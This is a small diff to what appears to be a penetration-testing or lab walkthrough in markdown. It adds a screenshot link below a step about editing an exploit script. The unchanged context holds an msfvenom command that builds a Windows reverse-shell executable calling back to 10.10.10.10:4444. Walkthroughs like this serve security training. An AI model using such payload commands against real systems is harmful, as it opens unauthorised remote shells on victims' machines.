@@ -22,6 +22,9 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shel
 
 edit 42315.py files
 
+![42315_PART_1](https://user-images.githubusercontent.com/55708909/91409346-eaaf0880-e862-11ea-8b35-88a345bb3cf7.png)
+
+
 
 
 
